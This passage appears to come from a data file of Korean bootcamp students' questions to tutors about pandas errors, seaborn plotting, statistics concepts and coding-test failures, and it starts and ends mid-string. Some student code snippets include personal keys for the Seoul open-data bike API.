제대로 선언이 안되서 그런건가요\u0026gt;\\n\\nKeyError: \"[\\'OderID\\' \\'Seq\\' \\'Oderdate\\' \\'RegisterDate\\' \\'Address\\'] not found in axis\"',\n","       \"열 추가에서 Age 추가할 때\\ntomato['Age'] = pd.to_datetime(tomato['BirthYear']).dt.year\\n이 코드로 작성하였더니 전체 1970으로 나옵니다ㅠㅠ 어떻게 해야 하나요?\",\n","       \"#평균\\nsex_mean = point_db.groupby(by = 'Gender', as_index = False)[['Amt']].mean()\\nsex_mean.head  \\n으로부터\\n\\n#평균 시각화\\nplt.figure(figsize = [5, 5])\\nplt.bar(sex_mean['Gender'], sex_mean['Amt'].mean())    \\nplt.title('성별간 구매량 평균')\\nplt.xlabel('성별')\\nplt.ylabel('평균')\\nplt.show()\\n\\n를 진행하는데 결과 그래프에서 양쪽 데이터값이 동일하게나옵니다 무엇이문제일까요?\",\n","       '현재 등급을 나누는 곳에서 범위를 지정햇으나 Nan으로 나오는 곳이 발생합니다 ㅠ',\n","       '그럼 birthyear에서 가져오면 안된다면 어떻게 해야할까요../? ',\n","       \"orders1 = pd.merge(orders, customers, on='CustomerID', how='inner')\\norders1 = pd.merge(orders, products, on='ProductID', how='inner')\\norders1\\n했더니 기존에 있던것들이 사라지는데 어떻게 해야 되나요?\",\n","       \"tmp=total.groupby(by = 'Gender', as_index = False)['Qty'].sum()\\ntmp=total.groupby(by = 'Gender', as_index = False)['Qty'].count()\\n중에 무엇을 써도 무방한가요?\",\n","       '구글 링크 부탁드려도 될까요? 번거롭게 해서 죄송합니다!\\n',\n","       \" 'value' must be an instance of str or bytes, not a float\",\n","       '강사님  여성의 카테고리별로 구매상품 합계를  알 수있을까요?',\n","       '해당 코드를 예제 입력1을 해보았을때 다음과 같이 실행되는데 어떤 문제가 있을까요?',\n","       \"안녕하세요!\\n\\n5과 실전문제 풀이 중 오류가 생겨 문의드립니다.\\n\\n문제를 풀던 중 계속 'function' object has no attribute 'sum' 오류가 발생했고, 무엇이 문제인지 모르겠습니다. 맨 위에 있는 import 문이 실행되지 않았나 싶어 다시 run 하고, 강사님 코드대로 따라해봤는데 다음과 같은 오류가 계속 발생합니다..\",\n","       'notnull() 메소드의 결과를 출력해보면 시리즈가 아닌, nan유무에 대한 불린 타입을 반환하는 것을 확인하실 수 있습니다.\\n\\npearsonr 메소드로 상관관계를 구할 때는 notnull()메소드로 nan값이 사전에 처리된 시리즈를 입력으로 넣어주어야 하므로 notnull()메소드 결과인 불린 타입을 인자로 넣게 되면 상관 계수가 반환되지 않습니다.\\n\\n--------------------------------------------------------------------------------------------------\\n안녕하세요. 보내주신 답변 감사합니다.\\n\\nnotnull() 메소드는 불린 타입의 데이터를 가진 시리즈를 반환하는 것을 확인하였습니다.\\n상관관계를 구할 때는 답변에 따르면  사전에 처리된 \\'시리즈\\'를 인자로 넣어주어야 한다고 하셨습니다.\\n\\n\\n실습에서는 다음과 같이 notnull() 메소드의 결과를 직접 인자로 취급하였습니다.\\n(solar.R은 NaN이 존재하는 column입니다.)\\n\\ntemp1 = air[\"Solar.R\"].notnull()\\nprint(spst.pearsonr(temp1, air[\"Ozone\"]))\\n\\n\\nair 데이터 프레임의\\nair[\"Solar.R\"] 시리즈는 NaN이 7개 존재하고 \\nair[\"Temp\"] 시리즈는 NaN이 없습니다.\\n\\n두 시리즈에 .notnull() 메소드를 사용하면 동일한 길이의 시리즈가 반환되는데\\n\\n왜 air[\"Solar.R\"] 만 결과값이 반환되는지 궁금합니다.\\n\\n제가 이해하지  못한 오류 결과를 같이 첨부합니다. \\n\\n감사합니다.\\n \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n',\n","       '혹시 저희 조(dx_2_5조) 실습 파일 정상적으로 완료되었는지 문의드립니다..\\n시간이 촉박해서 두번 제출한 것 같아서요.. \\n문의드려서 죄송합니다. ',\n","       '안녕하세요 개인과제 제출할때 \\ndx반 8반에서의 조로 적어야할까요 ?\\n아니면 에이들 에듀샹의 조편성으로 적어야할까요 ?\\n이전에는 8반에서의 조로 적었는데 혹시 문제가 될까요 ㅠㅠ',\n","       '매니저님이 이쪽에 문의해보라고 하셔서 여쭤봅니다.\\n\\n어제 셀프테스트는 제출했는데 과제공간엔 제출하는거 몰라서 미제출한거 같은데 괜찮을까요??\\n\\n따로 제출 할 방법은 없는건가요?',\n","       \"# 인증키\\nkey ='78646a436b6a617336374143646f4d'\\n\\nloop = 0\\nresult = []\\n\\n# 반복해서 가져와 연결하기\\nwhile True:\\n    start = 1 + loop +1000 #1,1001,2001,....이런식으로 나오게해서 끝나고 바로 다시 루프 이어지게!\\n    end = 1000 + loop *1000#루프가 0이면 1000, 1이면 2000이 나오게!\\n    url= f'http://openapi.seoul.go.kr:8088/{key}/json/bikeList/{start}/{end}/'\\n    # 데이터 가져오기\\n    response = urllib.request.urlopen(url) \\n    json_str = response.read().decode('utf-8')\\n    json_object = json.loads(json_str)\\n    \\n    result += json_object['rentBikeStatus']['row']\\n    \\n    if len(result) %1000 != 0: #1000으로 나눈 나머지가 0이 아니면 다 가져온거니 스탑해주기!\\n        break\\n        \\n    loop +=1\\n    \\n\\nbike = pd.json_normalize(result)\\n\\n\\n\\n\\n\\n# 확인\\nbike.head()\\n\\n    \\n    \\n    \\n    \\n 위와 같이 진행했는데 키에러가 뜨는것 같습니다ㅜㅜ\",\n","       \"실습2번 모든데이터 코드 받아볼수있을까요 ? \\n\\n# 인증키\\nkey = '796b47677663683137304f61475645'\\n\\nloop= 0\\nresult=[]\\n\\n# 반복해서 가져와 연결하기\\nwhile True:\\n    start = 1 + loop * 1000\\n    end = 1000 + loop * 1000\\n    url = f'http://openapi.seoul.go.kr:8088/{key}/json/bikeList/{start}/{end}/'\\n# 데이터 가져오기\\n    response = urllib.request.urlopen(url)\\n    json_str = response.read().decode('utf-8')\\n    json_object == json.loads(json_str)\\n    result += json_object['rentBikeStatus']['row']\\n\\n    if len(result % 1000 != 0:\\n        break\\n    loop += 1\\n\\n# Dictionary00 --\u0026gt; 데이터프레임으로 변환\\nbike = pd.json_normalize(result)\\n\\n# 확인\\nbike.head()\\n\\n도대체 뭐가 문제인가요 ..?\",\n","       'sort_values를 이용하여 정렬을 시켰는데 내림차순이 9이하로 진행되는거 같아 그 이유를 알고싶습니다.',\n","       \"cannot import name '_centered' from 'scipy.signal.signaltools' (c:\\\\Users\\\\User\\\\anaconda3\\\\lib\\\\site-packages\\\\scipy\\\\signal\\\\signaltools.py) 오류가 발생합니다. \\n\\n !pip install --upgrade scipy 을 해봤는데,  안되네요. 어떤 명령어로 해야할까요?\",\n","       \"오늘 실습에서 강사님께서 xml_dict['response']~ 이런 걸 하이라키라고 하셨는데\\n이거의 정확한 기능이 뭘까요...?\",\n","       '튜터님, 안녕하세요!\\n\\n혹시 이 중 일부 기간만 추출하여 구체적으로 보고 싶을 때, 코드는 어떻게 작성하면 되는 건지 문의드려도 될까요? [ : ] 을 활용해서 했던 것 같은데 , 잘 기억이 나질 않아 문의드립니다ㅠㅠ\\n\\n답변 감사드립니다!\\n\\n',\n","       '안녕하세요 3378 회전초밥 문제를 푸는 와중에 궁금한 것이 생겨 문의드립니다!\\n제가 채점을 했을 때 전부 다 성공이 나왔고, 예제 답도 똑같이 나와 정답이라고 생각하고 제출을 눌렀습니다.\\n하지만, 제출 결과를 보니 틀렸습니다가 나와서 코드를 바꿔보았고, 그것 역시 틀렸습니다가 나와서\\n혹시나 수식에 괄호를 하고 제출을 했더니 맞았습니다가 떴습니다.\\n코드 1\\nz = list(map(int, input().split()))\\ny = 1000 * z[0] + 1500 * z[1] + 2000 * z[2] + 3000 * z[3] + 5000 * z[4]\\nprint(y)\\n코드2\\na, b, c, d, e = map(int, input().split())\\nz = 1000 * a + 1500 * b + 2000 * c + 3000 * d + 5000 * e\\nprint(z)\\n이 코드 둘 다 틀렸습니다가 나왔고,\\na, b, c, d, e = map(int, input().split())\\nz = (1000 * a) + (1500 * b) + (2000 * c) + (3000 * d) + (5000 * e)\\nprint(z)\\n이렇게 하니까 맞았습니다가 떴습니다!\\n더하기보다 곱셈이 먼저니까 괄호를 하지 않았는데, 괄호의 유무에 따라서 답이 다른 이유가 궁금합니다!\\n감사합니다! \\n',\n","       \"위에서는 그래프를 두 개를 그려서 label = ' ' 할 수 있었는데 위 그림을 보면 그래프가 하나잖아요?\\n그러면 plt.legend() 를 쓰니깐 두 개를 나타낼 수가 없는데 \\n\\n지금 이 같은 경우는 xlabel / ylabel 써줘야하나요?  \",\n","       '다시 시험장에 들어간적도 없는데 결과에는 답안이 마킹도 되어있지 않고 0점처리가 나와서 문의드려요',\n","       '원격 부탁드립니다 ㅠ', 'bus_station.shape()이후로 진행이 안됩니다. ㅠ ',\n","       '답변 감사드립니다.\\n알려주신대로 고딕 글꼴 전체 다운후에 압축해제후 아래 3가지 내용대로 소스를 변경하여 시도하였음에도 동일합니다ㅠㅠㅠ\\n제가 어떤 부분을 추가로 수정하면 될까요??\\n# 시각화 한글폰트 설정\\nimport seaborn as sns\\nimport matplotlib.pyplot as plt\\n#plt.rcParams[\\'font.family\\'] = \\'NanumGothic\\'\\nplt.rc(\\'font\\', family=\\'NanumGothic\\')\\nsns.set(font=\"NanumGothicCoding\",#\"NanumGothicCoding\", \\n        rc={\"axes.unicode_minus\":False}, # 마이너스 부호 깨짐 현상 해결\\n        style=\\'darkgrid\\')     \\n\\n# 시각화 한글폰트 설정\\nimport seaborn as sns\\nimport matplotlib.pyplot as plt\\nplt.rcParams[\\'font.family\\'] = \\'NanumGothic\\'\\n#plt.rc(\\'font\\', family=\\'NanumGothic\\')\\nsns.set(font=\"NanumGothicCoding\",#\"NanumGothicCoding\", \\n        rc={\"axes.unicode_minus\":False}, # 마이너스 부호 깨짐 현상 해결\\n        style=\\'darkgrid\\')     \\n\\n\\n# 시각화 한글폰트 설정\\nimport seaborn as sns\\nimport matplotlib.pyplot as plt\\n#plt.rcParams[\\'font.family\\'] = \\'NanumGothic\\'\\nplt.rc(\\'font\\', family=\\'nanum\\')\\nsns.set(font=\"NanumGothicCoding\",#\"NanumGothicCoding\", \\n        rc={\"axes.unicode_minus\":False}, # 마이너스 부호 깨짐 현상 해결\\n        style=\\'darkgrid\\')     ',\n","       \"titanic.describe(include='all')와 titanic.describe()의 차이의 의미가 무엇인지 잘 모르겠습니다\",\n","       'sns와 plt가 겹치는 부분이 많다는 말을 들었습니다.\\n연습문제 중에 nan 값이 있으면 plt.boxplot의 불가능하기 때문에 .notnull()을 해야하는 문제가 있었는데, \\nsns.boxplot을 해봤더니 nan값을 처리해주지 않았는데도 boxplot이 출력되는 것을 확인했습니다.\\nsns.boxplot의 경우 nan값을 무시하고 출력해주는 건가요?\\n',\n","       '밀도함수 그래프에서 0미만의 값이 나오는 이유는 컴퓨터는 비즈니스적 관점이 아닌 그냥 기계적으로 계산해서 그래프를 그렸기 때문에 음수값이 나오는 걸로 그려진다.\\n라고 설명을 들었는데 그럼 실제 분석 및 활용할 때도 밀도(적분)값이 음수인 부분은 무시하는 건가요?',\n","       '테스트 케이스 6번 알려주실 수 있나요?',\n","       '밀도함수 그릴 때 다른 그래프는 plt인데 kdeplot은 sns로만 쓰는 건가요???(sns.kdeplot)',\n","       \"plt.figure(figsize = (6,8))\\nplt.subplot(3,1,1)\\nsns.histplot(data[var], bins = 20)\\n\\nplt.subplot(3,1,2)\\nsns.kdeplot(data[var])\\n\\nplt.subplot(3,1,3)\\nsns.boxplot(data[var])\\n\\nplt.tight_layout()\\nplt.show()\\n\\n\\n로 했는데 'tuple' object is not callable  이러한 에러가 뜹니다.\",\n","       \"\\nAttributeError: 'function' object has no attribute 'sum'\\n\\n이렇게 오류나옵니다\\n\\n커널 리스타트 해도 안됩니다.\",\n","       '혹시 그 df_seoul_bus_staion.csv 파일이랑 df_seoul_moving.csv 파일 어디서 다운받는지 다시 알려주실 수 있나요?',\n","       \"C:\\\\Users\\\\User\\\\anaconda3\\\\lib\\\\site-packages\\\\seaborn\\\\_decorators.py:36: FutureWarning: Pass the following variables as keyword args: x, y. From version 0.12, the only valid positional argument will be `data`, and passing other arguments without an explicit keyword will result in an error or misinterpretation.\\n  warnings.warn(\\n\\n이런오류는 무슨뜻인가요\\n\\n코드는\\nplt.figure(figsize = (13,4))\\n\\n\\nsns.scatterplot('Petal.Length','Petal.Width',data=iris, hue = 'Species')\\nplt.title('iris')\\nplt.show()\\n이겁니다\",\n","       '사진속 문구가\\n\\n괄호가 의미 하는 것은 seaborn의 PairGrid 라는 함수가 있는 실제 주소\\n\\n라고 답변 주신 거 잘 확인했습니다.\\n그런데 여기서 말하는 실제 주소가 무엇인지 모르겠네요...',\n","       'n = int(input())\\na = [list(map(int, input().split())) for _ in range(n)]\\nmin_list = []\\n\\nfor i in a:\\n  min_list.append(i[0])\\n  \\nmin_list.sort(reverse=True)\\nmin_max = min_list[0]\\nprint(min_max)\\n\\n케이스 6만 통과 못하는데 케이스 6이 뭔지 확인할 수 있나요',\n","       '가설 검정과 관련해서 궁금한 점이 있습니다.\\n\"기온 -\u0026gt; 수확량\" 같은 가설은 \"수확량:이라는 타겟이 누군가가 정한 게 아닌 자연의 결과라 가설을 검정하는 데 무리가 없다고 생각합니다. 반면, \"버스 정류장 수\"나 \"노선 수\"는 누군가가 어떤 규칙을 가지고 정한 수라는 생각이 들었습니다. 그렇기 때문에 해당 변수들을 타겟으로 두고 가설 검정을 하게 된다면 기존에  정책 결정 시에 사용한 규칙을 피쳐로 뒀을 때 높은 유의수준을 가지지 않나 싶습니다. 이러한 타겟에 대한 가설 검정은 실무에서 어떤 방식으로 이루어지는 지, 과제에서처럼 p-value를 확인하는 지 궁금합니다.',\n","       '그리고, 이건 실습 내용은 아닌데, \\nCRISP-DM 그림에서 비즈니스 이해 부분에\\n문제 정의와 더불어서 평가 지표를 제시해야 한다고 하셨는데,\\n평가 지표 제시가 문제 해결(프로젝트 완료) 후 개선된 문제를 평가할 수 있는 지표를 제시해야 한다고 이해했습니다. 제가 이해한 내용이 맞나요?',\n","       '안녕하세요! 오늘 배운 모집단과 표본 관련해서 궁금한 점이 생겨 질문 드립니다!\\n\\n\"표본으로부터 가설을 세워 검정하고 확인 과정을 거친 후, 이가 모집단에서도 그럴 것이라고 주장하게 된다.\" 라고 교안에 나와 있는데, 표본이 모집단을 대표할 수 있음을 검정하는 방법은 없나요? \\n\\n예를 들어, 분석 과제에서 전세계 여성과 남성의 이커머스 이용률은 다를 것이다. 라는 가설이 존재하다면, \\n모집단을 전체 분석하는 것엔 무리가 있으니, 임의로 한국의 여성과 남성의 데이터를 표본으로 뽑아 검정을 진행해도 되는 건가요? \\n\\n이럴 경우, 한국의 여성과 남성 데이터가 과연 전체 모집단의 대표성을 담고 있는 표본인지 검정할 떄 사용해도 되는 표본인지가 궁금한데, 실무에서 표본의 모집단 대표성을 어떻게 검정하는 지 궁금합니다!\\n',\n","       '8번 페이지에 코카콜라 맛있다 문제의 답안을 \\nN = int(input())\\na = list(range(1,100,3))\\nb = list(range(2,100,3))\\n\\n\\nif N in a:\\n  print(\\'jjamppong\\')\\nelif N in b:\\n  print(\"jjajangmyeon\")\\nelse:\\n  print(\"bokkeumbap\")\\n\\n이렇게 입력했는데 도저히 어디가 문제인지 모르겠습니다',\n","       'seaborn은 결측치를 어떻게 처리하나요...? 아예 제거하는 걸까요...?\\n예를 들어서 성별이 null값이지만, 나이와 생존여부는 not null인 데이터가 있다면 \\n생존여부와 성별을 분석할 때는 결측치가 어떻게 처리되고\\n나이와 생존여부를 분석할 때는 어떻게 처리되는지 궁금합니다..!\\n\\n그리고 pandas랑 stat는 결측치가 들어가면 에러로 반환한다는 거죠...?',\n","       '안녕하세요\\nttest함수를 이용해서 수치화를 했는데 결과값이 숫자로 나오는것이아니라\\n사진처럼 NAN 값이 뜹니다 ㅠㅠ\\n어떤 부분에서 오류가 났을 까요 ?\\n감사합니다.',\n","       '마지막에 강사님이 설명해주신 것이 \\n분산비(F 통계량) 0에 가까울수록 관련이 없다(귀무가설이다)\\n\\n분산비가(F 통계량) 0에서 멀어질수록 차이가 큰거죠?',\n","       '귀무가설과 대립가설\\n신뢰구간, p-value와 t-test에 대해 이해가 잘 가지않습니다.\\n\\n귀무가설과 대립가설은 제가 추가적으로 검색해봣었는데, 어떠한 문제를 해결할 때, 일부로 부정적인 가설을 설정한다. 이를 귀무가설이라 하고, 그것을 대립가설로 해결함으로써 문제를 해결한다.\\n이런 개념이었는데 이렇게 이해를 하면 되는건가요?\\n\\n또한 신뢰구간에서 양쪽 +-t값을 찾고 그 바깥쪽 면적의 합이 P-value라고 생각하면 될까요?\\n유의확률 P-value의 값이 통상적으로 5%인 유의수준보다 작으면 신뢰할수 있다고 판단하구요.\\n(유의확률 P-value가 커지면 신뢰구간이 작아지기 때문)',\n","       '앞의 부분을 전부 실행시키고 다른 식과 동일하게 작성했는데\\n값이  nan으로 뜨는 이유가 있을까요?',\n","       '표준 오차가 모평균을 구하는 것에 있어서 \\n어떻게 구해지는지 복습을 하는데 기억이 잘 나지 않습니다. \\n이 부분 한 번만 다시 설명해주실 수 있으신가요?ㅠㅠ',\n","       \"강사님이 배포해주신 PDF파일 34P를 보면 \\n'분석 단위'라고 있습니다. \\n여기서 분석 단위' 라는 단어가 정확히 무엇인지 모르겠습니다. \\n\\n그 옆에 있는 변수는 출력값에 영향을 주는 요인이라고 보면 되는건가요?\\n\",\n","       '안녕하세요!! \\n이론 복습하다가 귀무가설, 대립가설에 대해 제가 이해한 내용이 맞는지 여쭤보고자 문의 남깁니다!\\n\\n대립가설을 \"매장지역에 따라 수요량이 달라진다.\"라는 대립가설을 내세웠을 때,\\n검증 결과 매장지역과 수요량의 관계가 적다는 결론이 나왔다면,\\n대립가설을 채택하지 않음과 동시에 귀무가설도 채택하지 않는건가요?\\n대립가설의 채택/기각 = 귀무가설의 채택/기각인가요?',\n","       '안녕하세요!\\n1. 이변량, 단변량의 정확한 의미가 무엇인가요...?',\n","       '제가 이 문제를 DP로 접근했지만 계속 마지막 테스트 케이스가 틀렸다고 나와서 브루트 포스로 코드를 짜고 채점을 해봤습니다. 그런데 여전히 마지막 테스트 케이스를 통과하지 못 합니다. 혹시 몰라 영희가 먼저 게임을 하는 경우, (철수의 점수 - 영희의 점수)가 아닌 점수 차이(절댓값)로 코드도 짜봤습니다만 역시 마지막 테스트 케이스를 통과하지 못 합니다.\\n\\n제가 고려한 사항들입니다.\\n- 철수가 먼저 게임을 시작할 수도 있고 영희가 먼저 시작할 수도 있습니다\\n- 본인 턴이 되면 카드를 1개 이상 3개 이하 가져가야 하므로 카드를 가져가지 않고 턴을 넘길 수 없습니다.\\n\\n이 문제 때문에 오랫동안 끙끙대고 있습니다. 마지막 테스트 케이스가 지문과 논리적 모순이 없다고 말해주신다면 조금 더 고민해보겠습니다.',\n","       \"튜터님 안녕하세요. \\n\\n새벽에는 공부하는 것보다 푹 쉬라는 강사님들의 당부를 지키지 못하고 문의드리게 되었습니다.\\n이번 기회로 코딩하는걸 처음 해보게되었는데 제 코드로 답이 나오는 쾌감을 알게 된 이후 코딩에 중독되버렸습니다.ㅋㅋㅋ  성인이 된 이후로 이렇게 짜릿한 감정은 정말 오랜만입니다. 그래서 저는 이 문제를 꼭 풀고싶었는데 아무리해도 안되어 여쭤보게되었습니다.ㅠㅠ \\n\\n사담이 길었는데요. 첨부한 파일을 보시면 저는 'Timeout'이라는 오류가 뜹니다, 30초 이상 가동된다면 제 코드도 정답이 될 수 있을까요? 아니면 가동시간을 줄일 수 있는 함수가 따로 있을까요? \\n\\n\\n\",\n","       'pandas 라이브러리를 사용해서 풀었습니다.\\n\\n값을 입력하면 출력은 잘 나오는 것 같은데 Fail이 나옵니다.\\n\\n혹시 pandas를 쓰면 안되는지 아니면 코드가 문제인지 궁금합니다!',\n","       \"질문3(사진 X)\\nr1 = np.random.normal(loc=0, scale=0.5, size=100)\\nr2 = np.random.normal(loc=0.5, scale=1, size=100)\\nr3 = np.random.normal(loc=1, scale=1.5, size=100)\\nr4 = np.random.normal(loc=1.5, scale=2, size=100)\\nr5 = np.random.normal(loc=2, scale=2.5, size=100)\\n\\nf, ax = plt.subplots(1, 1)\\nax.boxplot((r1, r2, r3, r4, r5))\\nax.set_xticklabels(['r1', 'r2', 'r3', 'r4', 'r5']);\\n\\n여기서 f와 ax 두 개를 어떻게 한 번에 선언하는가... 이렇게 여러개를 한 번에 선언하는 것은 어떨 때 가능한 것이며. 각각은 어떤 걸 받아오는 것인지 궁금합니다.\\n\\n\\n감사합니다. :)\",\n","       '안녕하세요, 튜터님!\\n친절한 답변 감사합니다. \\n\\n그런데 첨부해주신 파일 중에서 \"t분포표 (자유도 9, 유의수준 0.05) .png \"이 다운로드가 안되어서, \\n한번만 다시 올려주실 수 있을까요?\\n\\n감사합니다!',\n","       '안녕하세요! 방금 수업에서 확률 추정 밀도함수 그래프 그리신 것 관련해서 질문이 있습니다.\\n어제 수업에서 p-value는 양측 검정이어서 양쪽 합쳐서 5%가 되어야한다 라고 하셨는데, 오늘 그래프에서 양측 다 -5, 5가 그려져 있어 헷갈려서 질문 드립니다!\\n양측 합해서 5%가 되려면 -2.5, 2.5가 되어야 하는게 아닐까 생각이 되는데, 제가 어느 부분에서 헷갈린 것인지 알려주시면 감사하겠습니다 ㅠㅠ',\n","       '상관분석에 있어서 상관계수의 의미는 이해했으나, p value가 나타내는 의미를 잘 모르겠습니다.',\n","       '지금 각 요소들에 대해 target과의 연관성에 대해 가설을 내리고 분석하고 있습니다.\\n오후에 발표에 있어서는 혹시 솔루션까지 해야하는걸까요? 아니면 각 요소들에 대한 대여량 변화까지 분석하는 걸까요?',\n","       \"지난주에 설명을 들었는데 까먹어서요ㅠㅠ\\n상관계수가 약하게 나오거나 아주 약하게 나와도 p-value가 0에 가깝거나 제가 설정한 값 이하의 값이라면 대립가설을 채택하는게 맞을까요?\\n만약 상관계수 0.04정도 나오고 p-value가 거의 0일 때 결론은 어떻게 되는걸까요? 저는 '대립가설을 채택하고 아주 미세한 상관관계가 있다' 라고 결론을 내린다고 생각합니다. 맞을까요?\",\n","       '현재 진행하고있는 따릉이 분석에서 미세먼지 열에 있는 NA값을 같은 시간대의 미세먼지값 평균으로 대체해서 채우려고 합니다.\\n이때 동일 시간대의 행을 찾는 메소드가 있는지 궁금함니다. ',\n","       \"캡쳐와 같이 '여름과 가을의 일별 평균 대여량에 관계가 있다' 라고 대립가설을 세운 뒤 기각하였습니다.\\n요일별로 일별 평균 대여량에 차이가 있을 것이라 생각해서 여름과 가을의 데이터는 목요일부터 8주간의 데이터로 통일하였습니다.\\n\\n그래서 둘 사이의 관계가 없다면 서로 독립적이다 즉 대여량에 대해 계절성이 있다 라고 생각하면 될까요??\",\n","       '범주형 데이터와 수치형 데이터 끼리 t검정을 하여 p value따라 귀무가설 혹은 대립가설을 채택하는것으로 알고 있습니다. \\n\\n강한 또는 약한 상관관계를 갖는지를 확인하는 방법이 있을까요?\\n\\n무슨 키워드로 검색해야 관련 자료를 찾을 수 있을까요?\\n\\n답변 부탁드립니다. 감사합니다.',\n","       '답변해주신 내용 감사합니다. \\n\\n수치형 데이터 끼리의 상관분석은 강한 상관관계, 약한 상관관계를 갖는 지를 판단할 수 있었습니다.\\n\\n그렇다면 범주형 데이터와 수치형 데이터의 T검정의 경우에는 p value값만을 가지고 강한 상관관계가 있다고 판단하면 옳은 판단일까요?  \\n\\n아니면 강도와는 상관없이   \"관련이 있는 데이터\"  라고 판단하는게 더 옳을까요?\\n\\n수업에서는 2번째가 맞다고 하셨던 걸로 기억이 나지만 확실치 않아서 다시 질문드립니다.\\n\\n감사합니다.',\n","       \"안녕하세요, 언제나 친절한 답변 감사합니다.\\n\\nplt.axhline(1-titanic['Survived'].mean(), color = 'r')\\n여기서, titanic['Survived'] 의 값이 0과 1이기 때문에, titanic['Survived'].mean()가 가지는 결과가 생존율이라는 것까지는 이해했습니다.\\n그래서 1에서 생존율을 빼면 사망율이 나온다고 생각했는데, 수업 중에는 전체에대한 평균이라하셔 이해가 되지 않아 질문 남깁니다.\",\n","       'kdeplot에서 common_norm = False이 있고 없고 차이가 이해가 안돼요',\n","       '안녕하세요 \\n의미 다시한번 알려주실 수 있나요??ㅜㅜ\\n\\n감사합니다. \\n',\n","       '카이제곱검정을 하는 과정에서 P VALUE가 의미하는 바는 잘 이해하였으나,  결과로 나오는 튜플의 첫 번째 값인  카이제곱통계량의 크기가 의미하는 바를 잘 모르겠습니다.',\n","       \"이미 문의를 하였으나 그럼에도 이해가 되지 않아서 다시 문의 남깁니다.\\n\\ntitanic['Survived'].mean() 도 mobile['CHURN'].mean()도 값이 0과 1로 구성되어있으니 각각이 생존율,  이탈율이라는 점은 이해했습니다.\\n\\n1-titanic['Survived'].mean() 이 사망율, 1-mobile['CHURN'].mean()이 잔류율이라는 것도 이해했습니다.\\n\\n이해가 되지 않는 부분은 \\n1) plt.axhline이 그리는 '전체 평균' 이 어째서 사망율과 잔류율이 되는 것인지.\\n     구체적으로는 1(전체)-생존율 = 전체인 점을 이해하지 못하겠습니다...\\n\\n2) 범주-\u0026gt;범주일 때는 '전체 평균'을 1-titanic['Survived'].mean()로, \\n    숫자-\u0026gt;범주일 때는 '전체 평균'을 titanic['Survived'].mean()로  plt.axhline를 그린다는 것입니다.\\n\\n매번 감사합니다.\",\n","       '3375 real escape string 문제 답안 잘받았습니다.\\n잘이해했는데 말씀하신대로 코드를 수정해도 fail이 뜨는데 도저히 이유를 모르겠습니다 ㅠㅠ\\n\\nS = input()\\n\\nif \"\\\\\\\\\" in S:\\n    S = S.replace(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\")\\nelif \"\\'\" in S:\\n    S = S.replace(\"\\'\",\"\\\\\\\\\\'\")\\nelif \\'\"\\' in S:\\n    S = S.replace(\\'\"\\',\\'\\\\\\\\\"\\')\\n\\nprint(S)',\n","       '2차 미니프로젝트 파일 미리 열어보려고 했더니 압축 푸는 과정에서 이렇게 오류가 뜨는데(오류캡쳐 사진) 괜찮은건가요? 그리고 파일이 3개 올라와있는데 1번만 다운되고 2번 3번은 1번을 열라면서 압축풀기가 안됩니다 (오류캡쳐 2 사진) \\n\\n압축 풀은 곳 들어가보니 오류 메세지에도 파일이 다 다운 받아져는 있는데 아래와 같이 열 이름이 이상합니다(오류캡쳐 3 사진)',\n","       'case4와 case6에서 실패하는데 어떤 문제가 있는지 알고 싶습니다.',\n","       '-1.5와 +.5의 의미를 설명해주시지 않으셔서 다시 질문 올립니다 ㅠㅠ',\n","       '---------------------------------------------------------------------------\\nPermissionError                           Traceback (most recent call last)\\n in \\n      1 # 아래에 실습코드를 작성하고 결과를 확인합니다.\\n      2 \\n----\u0026gt; 3 bus_station = pd.read_csv(\\'1.1 BUS_STATION_BOARDING_MONTH_202204.csv\\', sep=\",\", encoding = \"cp949\")\\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\io\\\\parsers.py in read_csv(filepath_or_buffer, sep, delimiter, header, names, index_col, usecols, squeeze, prefix, mangle_dupe_cols, dtype, engine, converters, true_values, false_values, skipinitialspace, skiprows, skipfooter, nrows, na_values, keep_default_na, na_filter, verbose, skip_blank_lines, parse_dates, infer_datetime_format, keep_date_col, date_parser, dayfirst, cache_dates, iterator, chunksize, compression, thousands, decimal, lineterminator, quotechar, quoting, doublequote, escapechar, comment, encoding, dialect, error_bad_lines, warn_bad_lines, delim_whitespace, low_memory, memory_map, float_precision, storage_options)\\n    608     kwds.update(kwds_defaults)\\n    609 \\n--\u0026gt; 610     return _read(filepath_or_buffer, kwds)\\n    611 \\n    612 \\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\io\\\\parsers.py in _read(filepath_or_buffer, kwds)\\n    460 \\n    461     # Create the parser.\\n--\u0026gt; 462     parser = TextFileReader(filepath_or_buffer, **kwds)\\n    463 \\n    464     if chunksize or iterator:\\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\io\\\\parsers.py in __init__(self, f, engine, **kwds)\\n    817             self.options[\"has_index_names\"] = kwds[\"has_index_names\"]\\n    818 \\n--\u0026gt; 819         self._engine = self._make_engine(self.engine)\\n    820 \\n    821     def close(self):\\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\io\\\\parsers.py in _make_engine(self, engine)\\n   1048             )\\n   1049         # error: Too many arguments for \"ParserBase\"\\n-\u0026gt; 1050         return mapping[engine](self.f, **self.options)  # type: ignore[call-arg]\\n   1051 \\n   1052     def _failover_to_python(self):\\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\io\\\\parsers.py in __init__(self, src, **kwds)\\n   1896 \\n   1897         try:\\n-\u0026gt; 1898             self._reader = parsers.TextReader(self.handles.handle, **kwds)\\n   1899         except Exception:\\n   1900             self.handles.close()\\n\\npandas\\\\_libs\\\\parsers.pyx in pandas._libs.parsers.TextReader.__cinit__()\\n\\npandas\\\\_libs\\\\parsers.pyx in pandas._libs.parsers.TextReader._get_header()\\n\\npandas\\\\_libs\\\\parsers.pyx in pandas._libs.parsers.TextReader._tokenize_rows()\\n\\npandas\\\\_libs\\\\parsers.pyx in pandas._libs.parsers.raise_parser_error()\\n\\nPermissionError: [Errno 13] Permission denied\\n\\n오류 어떤건가요??',\n","       \"1. seoul_moving['이동인구(합)'] 컬럼을 astype을 이용해 기존 object에서 int화 하려고 하는데, 사진처럼 '*' 값들 때문에 int화가 안됨.\\n2. 따라서 seoul_moving['이동인구(합)'] 에서, 사진처럼 '*' 처리 되어있는 부분을 결측치로 칭하고 모두 제거하려고 함.\\n3. seoul_moving.dropna()로 제거하려 했으나, NaN이 아닌 * 이기에 